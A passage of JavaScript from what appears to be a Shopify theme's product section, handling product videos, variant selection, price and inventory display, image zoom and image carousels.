            zoomImage: '.photo-zoom-link__initial'
        };

        var youtubeReady;
        var videos = {};
        var youtubePlayers = [];
        var youtubeVideoOptions = {
            height: '480',
            width: '850',
            playerVars: {
                autohide: 0,
                autoplay: 1,
                branding: 0,
                cc_load_policy: 0,
                controls: 0,
                fs: 0,
                iv_load_policy: 3,
                modestbranding: 1,
                playsinline: 1,
                quality: 'hd720',
                rel: 0,
                showinfo: 0,
                wmode: 'opaque'
            },
            events: {
                onReady: onVideoPlayerReady,
                onStateChange: onVideoStateChange
            }
        };

        var vimeoReady;
        var vimeoPlayers = [];
        var vimeoVideoOptions = {
            byline: false,
            title: false,
            portrait: false,
            loop: true
        };

        function onVideoPlayerReady(evt) {
            var $player = $(evt.target.a);
            var playerId = $player.attr('id');
            youtubePlayers[playerId] = evt.target; // update stored player
            var player = youtubePlayers[playerId];

            setParentAsLoading($player);

            if (videos[playerId].style === 'muted') {
                youtubePlayers[playerId].mute().playVideo().pauseVideo();
            } else {
                setParentAsLoaded($player);
            }

            // If first slide or only photo, start video
            if ($player.closest(selectors.currentSlide).length || $player.data('image-count') === 1) {
                if (videos[playerId].style === 'muted') {
                    youtubePlayers[playerId].playVideo();
                    initCheckVisibility(playerId);
                }
            }
        }

        function initCheckVisibility(playerId) {
            // Add out of view pausing
            videoVisibilityCheck(playerId);
            $(window).on('scroll.' + playerId, {
                id: playerId
            }, $.throttle(150, videoVisibilityCheck));
        }

        function videoVisibilityCheck(id) {
            var playerId;

            if (typeof id === 'string') {
                playerId = id;
            } else {
                // Data comes in as part of the scroll event
                playerId = id.data.id;
            }

            if (theme.isElementVisible($('#' + playerId))) {
                if (videos[playerId] && videos[playerId].style === 'unmuted') {
                    return;
                }
                playVisibleVideo(playerId);
            } else {
                pauseHiddenVideo(playerId);
            }
        }

        function playVisibleVideo(id) {
            if (youtubePlayers[id] && typeof youtubePlayers[id].playVideo === 'function') {
                youtubePlayers[id].playVideo();
            }
        }

        function pauseHiddenVideo(id) {
            if (youtubePlayers[id] && typeof youtubePlayers[id].pauseVideo === 'function') {
                youtubePlayers[id].pauseVideo();
            }
        }

        function onVideoStateChange(evt) {
            var $player = $(evt.target.a);
            var playerId = $player.attr('id');
            var player = youtubePlayers[playerId];

            switch (evt.data) {
                case -1: // unstarted
                    // Handle low power state on iOS by checking if
                    // video is reset to unplayed after attempting to buffer
                    if (videos[playerId].attemptedToPlay) {
                        setParentAsLoaded($player);
                        setVideoToBeInteractedWith($player);
                    }
                    break;
                case 0: // ended
                    player.playVideo();
                    break;
                case 1: // playing
                    setParentAsLoaded($player);
                    break;
                case 3: // buffering
                    videos[playerId].attemptedToPlay = true;
                    break;
            }
        }

        function setParentAsLoading($el) {
            $el
                .closest(selectors.videoParent)
                .addClass(classes.loading);
        }

        function setParentAsLoaded($el) {
            $el
                .closest(selectors.videoParent)
                .removeClass(classes.loading)
                .addClass(classes.loaded);
        }

        function setVideoToBeInteractedWith($el) {
            $el
                .closest(selectors.videoParent)
                .addClass(classes.interactable);
        }

        function Product(container) {
            var $container = this.$container = $(container);
            var sectionId = this.sectionId = $container.attr('data-section-id');

            this.inModal = $container.closest('.modal').length;
            this.$modal;

            this.settings = {
                enableHistoryState: $container.data('enable-history-state') || false,
                namespace: '.product-' + sectionId,
                zoom: $container.data('image-zoom') || false,
                inventory: $container.data('inventory') || false,
                modalInit: false,
                lazyLoadModalContent: $container.data('lazyload-content') || false,
                slickMainInitialized: false,
                slickThumbInitialized: false,
                hasImages: true,
                hasMultipleImages: false,
                imageSize: '620x'
            };

            // Overwrite some settings when loaded in modal
            if (this.inModal) {
                this.settings.enableHistoryState = false;
                this.settings.namespace = '.product-' + sectionId + '-modal';
                this.$modal = $('#QuickShopModal-' + sectionId);
            }

            this.selectors = {
                variantsJson: 'VariantsJson-' + sectionId,
                currentVariantJson: 'CurrentVariantJson-' + sectionId,

                video: 'ProductVideo-' + sectionId,
                photoThumbs: '.product__thumb-' + sectionId,
                thumbSlider: '#ProductThumbs-' + sectionId,
                mainSlider: '#ProductPhotos-' + sectionId,
                productImageMain: '.product-image-main--' + sectionId,

                priceWrapper: '.product__price-wrap-' + sectionId,
                price: '#ProductPrice-' + sectionId,
                comparePrice: '#ComparePrice-' + sectionId,
                savePrice: '#SavePrice-' + sectionId,
                priceA11y: '#PriceA11y-' + sectionId,
                comparePriceA11y: '#ComparePriceA11y-' + sectionId,
                sku: '#Sku-' + sectionId,
                inventory: '#ProductInventory-' + sectionId,

                addToCart: '#AddToCart-' + sectionId,
                addToCartText: '#AddToCartText-' + sectionId,

                originalSelectorId: '#ProductSelect-' + sectionId,
                singleOptionSelector: '.variant__input-' + sectionId,
                variantColorSwatch: '.variant__input--color-swatch-' + sectionId,

                modalFormHolder: '#ProductFormHolder-' + sectionId,
                formContainer: '#AddToCartForm-' + sectionId,
            };

            this.$mainSlider = $(this.selectors.mainSlider);
            this.$thumbSlider = $(this.selectors.thumbSlider);
            this.$firstProductImage = this.$mainSlider.find('img').first();

            if (!this.$firstProductImage.length) {
                this.settings.hasImages = false;
            }

            this.init();
        }

        Product.prototype = $.extend({}, Product.prototype, {
            init: function() {
                if (this.inModal) {
                    this.$container.addClass(classes.isModal);
                    $('body')
                        .off('modalOpen.QuickShopModal-' + this.sectionId)
                        .off('modalClose.QuickShopModal-' + this.sectionId);
                    $('body').on('modalOpen.QuickShopModal-' + this.sectionId, this.openModalProduct.bind(this));
                    $('body').on('modalClose.QuickShopModal-' + this.sectionId, this.closeModalProduct.bind(this));
                }

                if (!this.inModal) {
                    this.stringOverrides();
                    this.formSetup();
                    this.productSetup();

                    this.checkIfVideos();
                    this.createImageCarousels();

                    // Add product id to recently viewed array
                    this.addIdToRecentlyViewed();
                }
            },

            formSetup: function() {
                // Determine how to handle variant availability selectors
                if (theme.settings.dynamicVariantsEnable) {
                    if (theme.settings.dynamicVariantType === 'dropdown') {
                        this.$variantSelectors = {
                            all: $(this.selectors.formContainer).find('select'),
                            selected: $(this.selectors.formContainer).find('select')
                        }
                    } else {
                        this.$variantSelectors = {
                            all: $(this.selectors.formContainer).find('input'),
                            selected: $(this.selectors.formContainer).find('input:checked')
                        }
                    }
                }

                this.initQtySelector();
                this.initAjaxProductForm();
                this.initVariants();
            },

            productSetup: function() {
                this.setImageSizes();
                this.initImageSwitch();
            },

            addIdToRecentlyViewed: function() {
                var handle = this.$container.attr('data-product-handle');
                var url = this.$container.attr('data-product-url');
                var aspectRatio = this.$container.attr('data-aspect-ratio');
                var featuredImage = this.$container.attr('data-img-url');

                // Remove current product if already in set of recent
                if (theme.recentlyViewed.recent.hasOwnProperty(handle)) {
                    delete theme.recentlyViewed.recent[handle];
                }

                // Add it back to the end
                theme.recentlyViewed.recent[handle] = {
                    url: url,
                    aspectRatio: aspectRatio,
                    featuredImage: featuredImage
                };

                Cookies.set('theme-recent', JSON.stringify(theme.recentlyViewed.recent), {
                    path: '/',
                    expires: 10000
                });
            },

            stringOverrides: function() {
                theme.productStrings = theme.productStrings || {};
                $.extend(theme.strings, theme.productStrings);
            },

            setImageSizes: function() {
                if (!this.settings.hasImages) {
                    return;
                }

                // Get srcset image src, works on most modern browsers
                // otherwise defaults to settings.imageSize
                var currentImage = this.$firstProductImage[0].currentSrc;

                if (currentImage) {
                    this.settings.imageSize = theme.Images.imageSize(currentImage);
                }

                if (this.settings.zoom) {
                    this.settings.imageZoomSize = theme.Images.imageSize(this.$firstProductImage.parent().data('zoom-size'));
                }
            },

            initVariants: function() {
                if (!document.getElementById(this.selectors.variantsJson)) {
                    return;
                }

                this.variantsObject = JSON.parse(document.getElementById(this.selectors.variantsJson).innerHTML);

                var options = {
                    $container: this.$container,
                    enableHistoryState: this.settings.enableHistoryState,
                    singleOptionSelector: this.selectors.singleOptionSelector,
                    originalSelectorId: this.selectors.originalSelectorId,
                    variants: this.variantsObject
                };

                if ($(this.selectors.variantColorSwatch).length) {
                    $(this.selectors.variantColorSwatch).on('change', function(evt) {
                        var $el = $(evt.currentTarget);
                        var color = $el.data('color-name');
                        var index = $el.data('color-index');
                        this.updateColorName(color, index);
                    }.bind(this));
                }

                this.variants = new slate.Variants(options);
                this.$container.on('variantChange' + this.settings.namespace, this.updateCartButton.bind(this));
                this.$container.on('variantImageChange' + this.settings.namespace, this.updateVariantImage.bind(this));
                this.$container.on('variantPriceChange' + this.settings.namespace, this.updatePrice.bind(this));
                if ($(this.selectors.sku).length) {
                    this.$container.on('variantSKUChange' + this.settings.namespace, this.updateSku.bind(this));
                }
                if (this.settings.inventory) {
                    this.$container.on('variantChange' + this.settings.namespace, this.updateInventory.bind(this));
                }

                // Update individual variant availability on each selection
                if (theme.settings.dynamicVariantsEnable && document.getElementById(this.selectors.currentVariantJson)) {
                    this.currentVariantObject = JSON.parse(document.getElementById(this.selectors.currentVariantJson).innerHTML);

                    this.$variantSelectors.all.on('change' + this.settings.namespace, this.updateVariantAvailability.bind(this));

                    // Set default state based on current selected variant
                    this.setCurrentVariantAvailability(this.currentVariantObject, true);
                }
            },

            setCurrentVariantAvailability: function(variant) {
                var valuesToEnable = {
                    option1: [],
                    option2: [],
                    option3: []
                };

                // Disable all options to start
                this.disableVariantGroup($(this.selectors.formContainer).find('.variant-input-wrap'));

                // Combine all available variants
                var availableVariants = this.variantsObject.filter(function(el) {
                    if (variant.id === el.id) {
                        return false;
                    }

                    // Option 1
                    if (variant.option2 === el.option2 && variant.option3 === el.option3) {
                        return true;
                    }

                    // Option 2
                    if (variant.option1 === el.option1 && variant.option3 === el.option3) {
                        return true;
                    }

                    // Option 3
                    if (variant.option1 === el.option1 && variant.option2 === el.option2) {
                        return true;
                    }
                });


                // IE11 can't handle shortform of {variant} so extra step is needed
                var variantObject = {
                    variant: variant
                };

                availableVariants = Object.assign({}, variantObject, availableVariants);

                // Loop through each available variant to gather variant values
                for (var property in availableVariants) {
                    if (availableVariants.hasOwnProperty(property)) {
                        var item = availableVariants[property];
                        var option1 = item.option1;
                        var option2 = item.option2;
                        var option3 = item.option3;

                        if (option1) {
                            if (valuesToEnable.option1.indexOf(option1) === -1) {
                                valuesToEnable.option1.push(option1);
                            }
                        }
                        if (option2) {
                            if (valuesToEnable.option2.indexOf(option2) === -1) {
                                valuesToEnable.option2.push(option2);
                            }
                        }
                        if (option3) {
                            if (valuesToEnable.option3.indexOf(option3) === -1) {
                                valuesToEnable.option3.push(option3);
                            }
                        }
                    }
                }

                // Have values to enable, separated by option index
                if (valuesToEnable.option1.length) {
                    this.enableVariantOptionByValue(valuesToEnable.option1, 'option1');
                }
                if (valuesToEnable.option2.length) {
                    this.enableVariantOptionByValue(valuesToEnable.option2, 'option2');
                }
                if (valuesToEnable.option3.length) {
                    this.enableVariantOptionByValue(valuesToEnable.option3, 'option3');
                }
            },

            updateVariantAvailability: function(evt, value, index) {
                if (value && index) {
                    var newVal = value;
                    var optionIndex = index;
                } else {
                    var $el = $(evt.currentTarget);
                    var newVal = $el.val() ? $el.val() : evt.currentTarget.value;
                    var optionIndex = $el.data('index');
                }

                var variants = this.variantsObject.filter(function(el) {
                    return el[optionIndex] === newVal;
                });

                // Disable all buttons/dropdown options that aren't the current index
                $(this.selectors.formContainer).find('.variant-input-wrap').each(function(index, el) {
                    var $group = $(el);
                    var currentOptionIndex = $group.data('index');

                    if (currentOptionIndex !== optionIndex) {
                        // Disable all options as a starting point
                        this.disableVariantGroup($group);

                        // Loop through legit available options and enable
                        for (var i = 0; i < variants.length; i++) {
                            this.enableVariantOption($group, variants[i][currentOptionIndex]);
                        }
                    }
                }.bind(this));
            },

            disableVariantGroup: function($group) {
                if (theme.settings.dynamicVariantType === 'dropdown') {
                    $group.find('option').prop('disabled', true)
                } else {
                    $group.find('input').prop('disabled', true);
                    $group.find('label').toggleClass('disabled', true);
                }
            },

            enableVariantOptionByValue: function(array, index) {
                var $group = $(this.selectors.formContainer).find('.variant-input-wrap[data-index="' + index + '"]');

                for (var i = 0; i < array.length; i++) {
                    this.enableVariantOption($group, array[i]);
                }
            },

            enableVariantOption: function($group, value) {
                // Selecting by value so escape it
                value = value.replace(/([ #;&,.+*~\':"!^$[\]()=>|\/@])/g, '\\$1');

                if (theme.settings.dynamicVariantType === 'dropdown') {
                    $group.find('option[value="' + value + '"]').prop('disabled', false);
                } else {
                    var $buttonGroup = $group.find('.variant-input[data-value="' + value + '"]');
                    $buttonGroup.find('input').prop('disabled', false);
                    $buttonGroup.find('label').toggleClass('disabled', false);
                }
            },

            // Variant change functions
            updateColorName: function(color, index) {
                // Updates on radio button change, not variant.js
                $('#VariantColorLabel-' + this.sectionId + '-' + index).text(color);
            },

            updateCartButton: function(evt) {
                var variant = evt.variant;

                if (variant) {
                    if (variant.available) {
                        // Available, enable the submit button and change text
                        $(this.selectors.addToCart).removeClass(classes.disabled).prop('disabled', false);
                        $(this.selectors.addToCartText).html(theme.strings.addToCart);
                    } else {
                        // Sold out, disable the submit button and change text
                        $(this.selectors.addToCart).addClass(classes.disabled).prop('disabled', true);
                        $(this.selectors.addToCartText).html(theme.strings.soldOut);
                    }
                } else {
                    // The variant doesn't exist, disable submit button
                    $(this.selectors.addToCart).addClass(classes.disabled).prop('disabled', true);
                    $(this.selectors.addToCartText).html(theme.strings.unavailable);
                }
            },

            updatePrice: function(evt) {
                var variant = evt.variant;

                if (variant) {
                    // Regular price
                    $(this.selectors.price).html(theme.Currency.formatMoney(variant.price, theme.settings.moneyFormat)).show();

                    // Sale price, if necessary
                    if (variant.compare_at_price > variant.price) {
                        $(this.selectors.comparePrice).html(theme.Currency.formatMoney(variant.compare_at_price, theme.settings.moneyFormat));
                        $(this.selectors.priceWrapper).removeClass('hide');
                        $(this.selectors.price).addClass(classes.onSale);
                        $(this.selectors.comparePriceA11y).attr('aria-hidden', 'false');
                        $(this.selectors.priceA11y).attr('aria-hidden', 'false');

                        var savings = variant.compare_at_price - variant.price;

                        if (theme.settings.saveType == 'percent') {
                            savings = Math.round(((savings) * 100) / variant.compare_at_price) + '%';
                        } else {
                            savings = theme.Currency.formatMoney(savings, theme.settings.moneyFormat);
                        }

                        $(this.selectors.savePrice)
                            .removeClass('hide')
                            .html(theme.strings.savePrice.replace('[saved_amount]', savings));
                    } else {
                        $(this.selectors.priceWrapper).addClass('hide');
                        $(this.selectors.price).removeClass(classes.onSale);
                        $(this.selectors.comparePriceA11y).attr('aria-hidden', 'true');
                        $(this.selectors.priceA11y).attr('aria-hidden', 'true');
                        $(this.selectors.savePrice).addClass('hide')
                    }

                    if ($('body').hasClass('currencies-enabled')) {
                        theme.currencySwitcher.ajaxrefresh();
                    }
                }
            },

            updateSku: function(evt) {
                var variant = evt.variant;
                var newSku = '';

                if (variant) {
                    if (variant.sku) {
                        newSku = variant.sku;
                    }

                    $(this.selectors.sku).html(newSku);
                }
            },

            updateInventory: function(evt) {
                var variant = evt.variant;
                var showInventory = false;
                var quantity = 0;
                var $inventoryLabel = $(this.selectors.inventory);

                if (variant && variant.inventory_management === 'shopify') {
                    showInventory = true;
                    quantity = window.inventories[this.sectionId][variant.id];

                    if (quantity <= 0 || quantity > 10) {
                        showInventory = false;
                    }
                }

                if (!showInventory) {
                    $inventoryLabel.addClass('hide');
                } else {
                    $inventoryLabel
                        .removeClass('hide')
                        .text(theme.strings.stockLabel.replace('[count]', quantity));
                }
            },

            updateVariantImage: function(evt) {
                var variant = evt.variant;
                var sizedImgUrl = theme.Images.getSizedImageUrl(variant.featured_image.src, this.settings.imageSize);
                var zoomSizedImgUrl;

                if (this.settings.zoom) {
                    zoomSizedImgUrl = theme.Images.getSizedImageUrl(variant.featured_image.src, this.settings.imageZoomSize);
                }

                var $newImage = $('.product__thumb[data-id="' + variant.featured_media.id + '"]');
                var imageIndex = this._slideIndex($newImage.closest('.product__thumb-item'));

                // If there is no index, slider is not initalized
                if (typeof imageIndex === 'undefined') {
                    return;
                }

                this.$mainSlider.slick('slickGoTo', imageIndex);
            },

            // Image/thumbnail toggling
            initImageSwitch: function() {
                if (!$(this.selectors.photoThumbs).length) {
                    return;
                }

                var self = this;

                $(this.selectors.photoThumbs).on('click', function(evt) {
                    evt.preventDefault();
                });
            },

            checkIfVideos: function() {
                var $productVideos = this.$mainSlider.find(selectors.productVideo);

                // Stop if there are 0 videos
                if (!$productVideos.length) {
                    return false;
                }

                var videoTypes = [];

                $productVideos.each(function() {
                    var type = $(this).data('video-type');

                    if (videoTypes.indexOf(type) < 0) {
                        videoTypes.push(type);
                    }
                });

                // Load YouTube API if not already loaded
                if (videoTypes.indexOf('youtube') > -1) {
                    if (!theme.config.youTubeReady) {
                        window.loadYouTube();
                        $('body').on('youTubeReady' + this.settings.namespace, function() {
                            this.loadYoutubeVideos($productVideos);
                        }.bind(this));
                    } else {
                        this.loadYoutubeVideos($productVideos);
                    }
                }

                // Load Vimeo API if not already loaded
                if (videoTypes.indexOf('vimeo') > -1) {
                    if (!vimeoReady) {
                        window.loadVimeo();
                        $('body').on('vimeoReady' + this.settings.namespace, function() {
                            this.loadVimeoVideos($productVideos);
                        }.bind(this))
                    } else {
                        this.loadVimeoVideos($productVideos);
                    }
                }

                // Add mp4 video players
                if (videoTypes.indexOf('mp4') > -1) {
                    this.loadMp4Videos($productVideos);
                }

                return videoTypes;
            },

            loadMp4Videos: function($videos) {
                $videos.each(function() {
                    var $el = $(this);
                    if ($el.data('video-type') != 'mp4') {
                        return;
                    }

                    var id = $el.attr('id');
                    var videoId = $el.data('video-id');

                    videos[this.id] = {
                        type: 'mp4',
                        divId: id,
                        style: $el.data('video-style')
                    };
                });
            },

            loadVimeoVideos: function($videos) {
                $videos.each(function() {
                    var $el = $(this);
                    if ($el.data('video-type') != 'vimeo') {
                        return;
                    }

                    var id = $el.attr('id');
                    var videoId = $el.data('video-id');

                    videos[this.id] = {
                        type: 'vimeo',
                        divId: id,
                        id: videoId,
                        style: $el.data('video-style'),
                        width: $el.data('video-width'),
                        height: $el.data('video-height')
                    };
                });

                // Create a new player for each Vimeo video
                for (var key in videos) {
                    if (videos[key].type != 'vimeo') {
                        continue;
                    }

                    var args = $.extend({}, vimeoVideoOptions, videos[key]);
                    vimeoPlayers[key] = new Vimeo.Player(videos[key].divId, args);
                }

                vimeoReady = true;
            },

            autoplayVimeoVideo: function(id) {
                // Do not autoplay on mobile though
                if (!theme.config.bpSmall) {
                    this.requestToPlayVimeoVideo(id);
                } else {
                    // Set as loaded on mobile so you can see the image
                    var $player = $('#' + id);
                    setParentAsLoaded($player);
                }
            },

            requestToPlayVimeoVideo: function(id) {
                // The slider may initialize and attempt to play the video before
                // the API is even ready, because it sucks.

                var $player = $('#' + id);
                setParentAsLoading($player);

                if (!vimeoReady) {
                    // Wait for the trigger, then play it
                    $('body').on('vimeoReady' + this.settings.namespace, function() {
                        this.playVimeoVideo(id);
                    }.bind(this))
                    return;
                }

                this.playVimeoVideo(id);
            },

            playVimeoVideo: function(id) {
                vimeoPlayers[id].play();

                if (videos[id].style === 'muted') {
                    vimeoPlayers[id].setVolume(0);
                }

                var $player = $('#' + id);
                setParentAsLoaded($player);
            },

            stopVimeoVideo: function(id) {
                if (!theme.config.vimeoReady) {
                    return;
                }

                if (id) {
                    vimeoPlayers[id].pause();
                } else {
                    for (key in vimeoPlayers) {
                        if (typeof vimeoPlayers[key].pause === 'function') {
                            vimeoPlayers[key].pause();
                        }
                    }
                }
            },

            loadYoutubeVideos: function($videos) {
                $videos.each(function() {
                    var $el = $(this);
                    if ($el.data('video-type') != 'youtube') {
                        return;
                    }

                    var id = $el.attr('id');
                    var videoId = $el.data('youtube-id');

                    videos[this.id] = {
                        type: 'youtube',
                        id: id,
                        videoId: videoId,
                        style: $el.data('video-style'),
                        width: $el.data('video-width'),
                        height: $el.data('video-height'),
                        attemptedToPlay: false
                    };
                });

                // Create a player for each YouTube video
                for (var key in videos) {
                    if (videos[key].type === 'youtube') {
                        if (videos.hasOwnProperty(key)) {
                            var args = $.extend({}, youtubeVideoOptions, videos[key]);

                            if (args.style === 'muted') {
                                // default youtubeVideoOptions, no need to change anything
                            } else {
                                args.playerVars.controls = 1;
                                args.playerVars.autoplay = 0;
                            }

                            youtubePlayers[key] = new YT.Player(key, args);
                        }
                    }
                }

                youtubeReady = true;
            },

            requestToPlayYoutubeVideo: function(id, forcePlay) {
                if (!theme.config.youTubeReady) {
                    return;
                }

                var $player = $('#' + id);
                setParentAsLoading($player);

                // If video is requested too soon, player might not be ready.
                // Set arbitrary timeout to request it again in a second
                if (typeof youtubePlayers[id].playVideo != 'function') {
                    var o = this;
                    setTimeout(function() {
                        o.playYoutubeVideo(id, forcePlay);
                    }, 1000);
                    return;
                }

                this.playYoutubeVideo(id, forcePlay);
            },

            playYoutubeVideo: function(id, forcePlay) {
                var $player = $('#' + id);
                setParentAsLoaded($player);
                if (typeof youtubePlayers[id].playVideo === 'function') {
                    youtubePlayers[id].playVideo();
                }

                // forcePlay is sent as true from beforeSlideChange so the visibility
                // check isn't fooled by the next slide positioning
                if (!forcePlay) {
                    initCheckVisibility(id);
                }
            },

            stopYoutubeVideo: function(id) {
                if (!theme.config.youTubeReady) {
                    return;
                }

                if (id && youtubePlayers[id]) {
                    if (typeof youtubePlayers[id].pauseVideo === 'function') {
                        youtubePlayers[id].pauseVideo();
                    }
                    $(window).off('scroll.' + id);
                } else {
                    for (key in youtubePlayers) {
                        if (typeof youtubePlayers[key].pauseVideo === 'function') {
                            youtubePlayers[key].pauseVideo();
                            $(window).off('scroll.' + key);
                        }
                    }
                }
            },

            playMp4Video: function(id) {
                var $player = $('#' + id);
                setParentAsLoaded($player);

                $player[0].play();
            },

            stopMp4Video: function(id) {
                if (id) {
                    $('#' + id)[0].pause();
                } else {
                    // loop through all mp4 videos to stop them
                    for (var key in videos) {
                        if (videos[key].type === 'mp4') {
                            var player = $('#' + videos[key].divId)[0];
                            if (typeof player.pause === 'function') {
                                player.pause();
                            }
                        }
                    }
                }
            },

            // Init zoom for each image in the main carousel
            initZoom: function($image) {
                var largeImage = $image.parent().data('zoom-size');
                $image.parent()
                    .on('click', function(evt) {
                        evt.preventDefault();
                    })
                    .zoom({
                        on: 'click',
                        url: largeImage,
                        duration: 180,
                        touch: false,
                        onZoomIn: function() {
                            $(this).addClass('photo-zoom-linked');
                        },
                        onZoomOut: function() {
                            $(this).removeClass('photo-zoom-linked');
                        }
                    });
            },

            destroyZoom: function($image) {
                $image.trigger('zoom.destroy');
            },

            createImageCarousels: function() {
                // Init zoom since the carousel won't do it
                if (this.settings.zoom) {
                    this.initZoom($(this.selectors.productImageMain).find(selectors.zoomImage));
                }

                if (!this.$thumbSlider.length || $(this.selectors.photoThumbs).length < 2) {
                    // Single product image. Init video if it exists
                    var $video = $(this.selectors.productImageMain).find(selectors.productVideo);
                    if ($video.length) {
                        this.initVideo($video);
                    }
                    return;
                }

                this.settings.hasMultipleImages = true;

                // Set starting slide (for both sliders)
                var $activeSlide = this.$mainSlider.find('.starting-slide');
                var startIndex = this._slideIndex($activeSlide);

                // Lame way to prevent duplicate event listeners
                this.$mainSlider.off('init');
                this.$mainSlider.off('beforeChange');
                this.$mainSlider.on('init', this.mainSlideInit.bind(this));
                this.$mainSlider.on('beforeChange', this.beforeSlideChange.bind(this));

                // Default (mobile) slider settings
                this.mainSliderArgs = {
                    infinite: true,
                    arrows: false,
                    dots: true,
                    adaptiveHeight: true,
                    initialSlide: startIndex
                };

                this.thumbSliderArgs = {
                    initialSlide: startIndex
                };

                // Init sliders normally
                var sliderArgs = this.setSliderArgs();
                this.initSliders(sliderArgs);

                // Re-init slider when a breakpoint is hit
                $('body').on('matchSmall matchLarge', function() {
                    var sliderArgs = this.setSliderArgs();
                    this.initSliders(sliderArgs);
                }.bind(this));

                // Too many thumbnails can cause the AOS calculations to be off
                // so refresh that when the slider is ready
                if (AOS) {
                    AOS.refresh();
                }
            },

            initSliders: function(args) {
                this.destroyImageCarousels();

                this.$mainSlider.slick(args.main);
                if (!theme.config.bpSmall) {
                    this.$thumbSlider.slick(args.thumbs);
                    this.settings.slickThumbInitialized = true;
                }

                this.settings.slickMainInitialized = true;
            },

            setSliderArgs: function() {
                var args = {};
                var thumbnailsVertical = this.$thumbSlider.data('position') === 'beside' ? true : false;

                if (theme.config.bpSmall) {
                    args.main = this.mainSliderArgs;
                    args.thumbs = this.thumbSliderArgs;
                } else {
                    args.main = $.extend({}, this.mainSliderArgs, {
                        asNavFor: this.selectors.thumbSlider,
                        adaptiveHeight: thumbnailsVertical ? false : true,
                        dots: false,
                        infinite: false,
                        fade: true
                    });
                    args.thumbs = $.extend({}, this.thumbSliderArgs, {
                        asNavFor: this.selectors.mainSlider,
                        slidesToShow: thumbnailsVertical ? 3 : 5,
                        slidesToScroll: 1,
                        arrows: false,
                        dots: false,
                        vertical: thumbnailsVertical,
                        verticalSwiping: thumbnailsVertical,
                        focusOnSelect: true,
                        infinite: false,
                        customHeightMatching: thumbnailsVertical,
                        customSlideAdvancement: true
                    });
                }

                return args;
            },

            destroyImageCarousels: function() {
                if (this.$mainSlider && this.settings.slickMainInitialized) {
                    this.$mainSlider.slick('unslick');
                    this.settings.slickMainInitialized = false;
                }

                if (this.$thumbSlider && this.settings.slickThumbInitialized) {
                    this.$thumbSlider.slick('unslick');
                    this.settings.slickThumbInitialized = false;
                }
            },

            mainSlideInit: function(event, slick) {
                var $slider = slick.$slider;
                var $currentSlide = $slider.find(selectors.currentSlide);
                var $video = $currentSlide.find(selectors.productVideo);

                if (!$video.length) {
                    return;
                }

                this.initVideo($video);
            },

            initVideo: function($video) {
                var videoType = $video.data('video-type');
                var divId = $video.attr('id');

                if (videoType === 'mp4' && videos[divId].style === 'muted') {
                    this.playMp4Video(divId);
                }

                if (videoType === 'youtube') {
                    if (youtubeReady && videos[divId].style === 'muted') {
                        this.requestToPlayYoutubeVideo(divId);
                    }
                }

                if (videoType === 'vimeo') {
                    if (vimeoReady) {
                        this.playOrShowVimeo(divId);
                    } else {
                        $('body').on('vimeoReady' + this.settings.namespace, function() {
                            this.playOrShowVimeo(divId);
                        }.bind(this))
                    }
                }

                // Hacky way to trigger resetting the slider layout in modals
                if (this.inModal) {
                    this.resizeSlides();
                }
            },

            playOrShowVimeo: function(id) {
                if (videos[id] && videos[id].style === 'muted') {
                    this.autoplayVimeoVideo(id);
                } else if (videos[id] && videos[id].style === 'unmuted') {
                    setParentAsLoaded($('#' + id));
                }
            },

            getVideoType: function($video) {
                return $video.data('video-type');
            },

            getVideoId: function($video) {
                return $video.attr('id');
            },

            beforeSlideChange: function(event, slick, currentSlide, nextSlide) {
                var $slider = slick.$slider;
                var $currentSlide = $slider.find(selectors.currentSlide);
                var $prevVideo = $currentSlide.find('.product__video');
                var $nextSlide = $slider.find('.slick-slide[data-slick-index="' + nextSlide + '"]');
                var $nextVideo = $nextSlide.find('.product__video');

                // Pause any existing slide video
                if (currentSlide !== nextSlide && $prevVideo.length) {
                    var prevVideoType = this.getVideoType($prevVideo);
                    var prevVideoId = this.getVideoId($prevVideo);

                    if (prevVideoId) {
                        if (prevVideoType === 'youtube') {
                            this.stopYoutubeVideo(prevVideoId);
                        }

                        if (prevVideoType === 'mp4') {
                            this.stopMp4Video(prevVideoId);
                        }

                        if (prevVideoType === 'vimeo') {
                            this.stopVimeoVideo(prevVideoId);
                        }
                    }
                }

                // Prep next slide video
                if ($nextVideo.length) {
                    var nextVideoType = this.getVideoType($nextVideo);
                    var nextVideoId = this.getVideoId($nextVideo);

                    // Prep Vimeo with a backup in case the API isn't ready
                    if (nextVideoId && nextVideoType === 'vimeo') {
                        if (vimeoReady) {
                            if (videos[nextVideoId] && videos[nextVideoId].style === 'muted') {
                                this.autoplayVimeoVideo(nextVideoId);
                            }
                        } else {
                            $('body').on('vimeoReady' + this.settings.namespace, function() {
                                if (videos[nextVideoId] && videos[nextVideoId].style === 'muted') {
                                    this.autoplayVimeoVideo(nextVideoId);
                                }
                            }.bind(this))
                        }
                    }

                    // Prep YouTube with a backup in case API isn't ready
                    if (nextVideoId && nextVideoType === 'youtube') {
                        if (youtubeReady) {
                            if (videos[nextVideoId] && videos[nextVideoId].style === 'muted') {
                                this.requestToPlayYoutubeVideo(nextVideoId, true);
                            }
                        } else {
                            $('body').on('youTubeReady' + this.settings.namespace, function() {
                                if (videos[nextVideoId] && videos[nextVideoId].style === 'muted') {
                                    this.requestToPlayYoutubeVideo(nextVideoId, true);
                                }
                            }.bind(this))
                        }
                    }

                    // Autoplay muted MP4 videos
                    if (nextVideoId && videos[nextVideoId] && videos[nextVideoId].style === 'muted') {
                        if (nextVideoType === 'mp4') {
                            this.playMp4Video(nextVideoId);
                        }
                    }

                    // Set unmuted videos to loaded state
                    if (nextVideoId && videos[nextVideoId] && videos[nextVideoId].style != 'muted') {
                        setParentAsLoaded($('#' + nextVideoId));
                    }
                }

                // Layload zoom image
                if (this.settings.zoom) {
                    var $currentImage = $currentSlide.find('img');
                    this.destroyZoom($currentImage);

                    var $image = $nextSlide.find('img').addClass('lazyload');
                    this.initZoom($image);
                }
            },

            resizeSlides: function() {
                if (!this.settings.hasMultipleImages) {
                    return;
                }

                $(window).trigger('resize');
                setTimeout(function() {
                    this.$mainSlider.slick('setPosition');
                    this.$thumbSlider.slick('setPosition');
                }.bind(this), 500); // same timing as modal open transition
            },

            _slideIndex: function($el) {
                return $el.data('index');
            },

            initQtySelector: function() {
                this.$container.find('.js-qty__wrapper').each(function() {
                    new theme.QtySelector($(this), {
                        namespace: '.product'
                    });
                });
            },

            initAjaxProductForm: function() {
                if (theme.settings.cartType === 'drawer' && typeof(theme.editLine) == 'undefined' ) {
                    new theme.AjaxProduct($(this.selectors.formContainer));
                }
            },

            openModalProduct: function() {
                if (!this.settings.modalInit) {
                    var $formHolder = $(this.selectors.modalFormHolder);
